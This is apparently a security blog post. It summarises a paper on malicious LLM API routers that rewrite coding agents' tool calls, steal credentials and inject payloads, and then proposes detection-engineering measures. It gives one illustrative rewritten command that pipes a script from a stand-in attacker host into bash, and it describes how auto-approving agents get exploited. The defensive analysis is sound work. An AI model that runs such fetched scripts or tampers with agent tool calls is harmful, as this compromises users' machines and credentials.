---
layout: post
title:  "When AI Agents Become Supply Chain Infrastructure"
category: security
author: "Mark F Hunt"
---

This post is based on a recent paper [Your Agent Is Mine: Measuring Malicious Intermediary Attacks on the LLM Supply Chain](https://arxiv.org/abs/2604.08407v1)

I've been thinking a lot lately on detection engineering for GenAI, especially agentic AI. We've barely cracked the problem of detecting when a user installs malware or an attacker runs an exploit. Are we ready for when Claude Code triggers an exploit while connected to our internal repos and running as root autonomously on our developer's laptops?

This paper discusses AI router use and supply chain attacks. The authors found LLM API routers with active payload injection, credential abuse, adaptive evasion, and even cryptocurrency theft already occurring in the wild. This isn't theoretical: in March, LiteLLM was compromised through a dependency-confusion supply chain attack, inserting malicious code into the request-handling pipeline of affected deployments. Compromising a router like this allows an attacker to inspect prompts and responses, rewrite tool calls, exfiltrate credentials, and even propagate further supply chain attacks (rewrite `pip install xyz`).

## LLM API Routers
These are things like OpenRouter or LiteLLM. They sit between the AI agent client (Claude Code, Codex, openClaw, etc) and the upstream providers (Anthropic, OpenAI, etc). These routers see everything in plaintext. Prompts, tool calls, API keys, shell commands, credentials, responses. And there is **no cryptographic check proving the tool call your agent uses is what the upstream model actually generated.**

Imagine Claude Code decides to run:  
`curl https://safevendor.com/install.sh | bash`

The router intercepts the JSON tool call and silently rewrites it into:  
`curl https://evil.com/pwn.sh | bash`

The AI agent never knows, the user never knows, the upstream provider never knows. This goes beyond prompt injection and becomes *payload injection*. And it's trusted by design, so transport-level security does *nothing* to prove that the tool call your agent received is what the upstream provider actually generated.

## YOLO
The paper found that most of these requests were from the agents running autonomously ("YOLO mode"), where they would auto-approve tool execution. The attackers didn't need social engineering or prompt injection. The agents were already configured to execute automatically.

## Trust boundaries collapse. 
Routers are now code execution infrastructure. Detection opportunities have to move earlier in the chain.

AI agents are becoming remote execution orchestration systems. This is the real shift detection engineers need to internalize: AI agents are no longer just generating text. They are becoming delegated execution systems with direct access to shells, package managers, cloud infrastructure, CI/CD pipelines, and internal repositories.

## What Can We Do?

With programs like [MITRE ATLAS](https://atlas.mitre.org) and CompTIA [SecAI+](https://www.comptia.org/en/certifications/secai), the security world is finally starting to catch up to the risks that agentic AI is posing. But are we actually doing anything about it? We are developing a language to model the threat landscape but what can we realistically do? Does your organization log AI prompts and responses? Do you track what Claude is doing on your user workstations? Even a simpler question: can you tell what actions were taken by Claude versus which were done intentionally by a user? Does your organization's AI trust and safety team share this information with your IR or detection engineering team?

This paper discusses attacks in router chains, as the authors call it: "poisoning benign and trusted routers". The idea is that one malicious LLM API router can rewrite sessions in a way that compromises the entire LLM structure.

>once a supposedly benign router path reuses a stolen upstream credential, the holder of that credential inherits the same plaintext visibility as an actively malicious router.

## Detection Challenges

Historically we would detect malicious activity:
- user launches Powershell
- malware launches curl
- process tree shows execution
- we detect the endpoint activity

But agentic AI launches new questions.
- who generated the command?
- was it model-originated or router-modified?
- was the session autonomous?
- did the tool call cryptographically match provider output?
- did the agent suddenly start behaving differently?

Which raises a crucial question for detection engineers: **do I care whether Claude installed malware or the user did?**. The endpoint still got popped. Does the distinction matter?

Yes.

Because we can now build detections around agent-mediated execution, tool call provenance, autonomous mode, API routing infrastructure, LLM session metadata, unusual tool invocation patterns. Going beyond 'just another log source', we're getting into *a new detection domain*.

## Detection Opportunities

1. Detect AI-originated command execution

Was this human-initiated? Was it auto-approved? Did it occur via agent tool call?

2. Detect tool-call tampering

Can we determine if there was a mismatch between the displayed prompt and the executed command? Can we check for unusual or typo-squatted package/registry names? Can we determine semantic drift between conversation and execution?

3. Detect autonomous AI workflows

The paper specifically calls out YOLO mode. Can we detect long-running sessions? Repeated unattended execution? Bursty shell tool usage? High-volume command chaining?

4. AI Supply Chain Detections

Hitting the paper's topic more directly: can we detect unknown API routers? Unofficial OpenAI proxies or non-corporate routing infrastructure? Model provider mismatch?

Of course, many of these detection opportunities collide directly with privacy and governance concerns. Logging prompts, tool calls, and autonomous AI behavior may expose proprietary code, sensitive business logic, or employee activity. Organizations will have to decide whether AI telemetry should be treated more like endpoint telemetry, SaaS audit logs, or developer source code.

## It's Nothing New

This is all core cybersecurity topics:
- middleware security
- proxy trust
- CI/CD integrity
- package supply chain

It's just wrapped in agentic tooling instead of NPM and Jenkins. It's classic supply chain trust boundaries.

But the difference is, AI agents are becoming unpaid employees faster than organizations are adapting their security models. And detections need to move to reflect this shift in where the infrastructure really lives.